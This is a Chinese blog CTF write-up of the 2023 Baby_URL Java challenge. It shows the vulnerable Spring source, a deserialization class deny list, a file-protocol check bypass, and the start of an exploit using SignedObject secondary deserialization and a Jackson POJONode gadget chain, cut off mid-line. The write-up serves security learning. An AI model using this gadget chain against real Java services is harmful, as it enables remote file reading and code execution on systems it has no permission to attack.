@@ -1,0 +1,735 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    记一次jackson原生链+二次反序列化 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC] 来源于巅峰极客2023Baby_URL，不算很难，只不过我实在找不到适合的java题了 看依赖：就是给了一些spring依赖，众所周知，在 Spring Boot 中，通常自带jackson  jar包结构：  IndexController.java： 123456789101112131415161718192021222324252627282930313233343536373">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次jackson原生链+二次反序列化">
+<meta property="og:url" content="http://example.com/2025/10/05/%E8%AE%B0%E4%B8%80%E6%AC%A1jackson%E5%8E%9F%E7%94%9F%E9%93%BE-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC] 来源于巅峰极客2023Baby_URL，不算很难，只不过我实在找不到适合的java题了 看依赖：就是给了一些spring依赖，众所周知，在 Spring Boot 中，通常自带jackson  jar包结构：  IndexController.java： 123456789101112131415161718192021222324252627282930313233343536373">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/10/05/images/cc3e17825ed0ec5dc45fb58b9ba64d22.png">
+<meta property="og:image" content="http://example.com/2025/10/05/images/image-20240803211530820.png">
+<meta property="og:image" content="http://example.com/2025/10/05/images/image-20240803211139099.png">
+<meta property="og:image" content="http://example.com/2025/10/05/images/image-20240803211143135.png">
+<meta property="article:published_time" content="2025-10-05T03:56:14.000Z">
+<meta property="article:modified_time" content="2025-12-16T16:25:19.212Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="Jackson原生反序列化+二次反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/10/05/images/cc3e17825ed0ec5dc45fb58b9ba64d22.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="记一次jackson原生链+二次反序列化">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">记一次jackson原生链+二次反序列化</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#signedobject%E6%89%93%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.</span> <span class="toc-text"> SignedObject打二次反序列化绕过黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#templatesimpl%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text"> TemplatesImpl恶意字节码</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-记一次jackson原生链-二次反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/10/05/%E8%AE%B0%E4%B8%80%E6%AC%A1jackson%E5%8E%9F%E7%94%9F%E9%93%BE-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-10-05T03:56:14.000Z" itemprop="datePublished">2025-10-05</time>
+    <time style="display: none;" id="post-update-time">2025-12-17</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<p>来源于巅峰极客2023Baby_URL，不算很难，只不过我实在找不到适合的java题了</p>
+<p>看依赖：就是给了一些spring依赖，众所周知，在 Spring Boot 中，通常自带jackson</p>
+<p><img src="../images/cc3e17825ed0ec5dc45fb58b9ba64d22.png" alt="img" /></p>
+<p>jar包结构：</p>
+<p><img src="../images/image-20240803211530820.png" alt="image-20240803211530820" /></p>
+<p><strong>IndexController.java</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/hack&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hack</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line">            System.out.println(o);</span><br><span class="line">            System.out.println(o.url);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> var6;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/file&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">file</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/file&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        fis.read(bytes);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>URLHelper.java</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLHelper</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String url;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">URLVisiter</span> <span class="variable">visiter</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">URLHelper</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.visiter != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.visiter.visitUrl(<span class="built_in">this</span>.url);</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            fos.write(result.getBytes());</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>URLVisitor.java</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLVisiter</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">URLVisiter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">visitUrl</span><span class="params">(String myurl)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (myurl.startsWith(<span class="string">&quot;file&quot;</span>)) &#123;  <span class="comment">//不能以file开头</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file protocol is not allowed&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                url = <span class="keyword">new</span> <span class="title class_">URL</span>(myurl);</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(url.openStream()));</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">                String inputLine;</span><br><span class="line">                <span class="keyword">while</span>((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    sb.append(inputLine);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                in.close();</span><br><span class="line">                <span class="keyword">return</span> sb.toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> var6;</span><br><span class="line">                <span class="keyword">return</span> e.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>/hack路由下很明显的反序列化，/file是读文件的</p>
+<p>再看两个URL自定义模板类，它们都继承了Serializable接口。</p>
+<p>URLHelper重写了readObject方法，即为入口类。调用了任意类的visitUrl方法，并把结果写进文件里</p>
+<p>URLVisiter通过指定url访问其内部资源然后返回</p>
+<p>只不过我们需要注意的是/hack路由的反序列化部分，它使用的是自定义的输入流的类<code>MyObjectInputStream</code>。这个类重写了<code>resolveClass</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        String[] denyClasses = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.net.InetAddress&quot;</span>, <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(String denyClass : denyClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(denyClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>resolveClass里有黑名单，把InetAddress，CC链，URLVisiter，URLHelper都ban了，不是，咋还ban自己写的啊</p>
+<p>那这里直接SignedObject打二次反序列化绕过黑名单</p>
+<h2 id="signedobject打二次反序列化绕过黑名单"><a class="markdownIt-Anchor" href="#signedobject打二次反序列化绕过黑名单"></a> SignedObject打二次反序列化绕过黑名单</h2>
+<p><code>SignedObject</code>的二次反序列化能够让我们正常使用到题目提供的<code>URLHelper</code>和<code>URLVister</code>，然后思路也很清晰，就是打<code>/hack</code>反序列化，file的<code>startWith</code>绕过可以在前面<strong>加个空格，或者全大写绕过</strong>。第一次读取目录和文件名找flag（是的，file://可以读目录），第二次读取flag。<code>/flie</code>路由可以读取到回显内容。</p>
+<p>EXP还是挺简单的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eddiemurphy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//重写jackson</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span 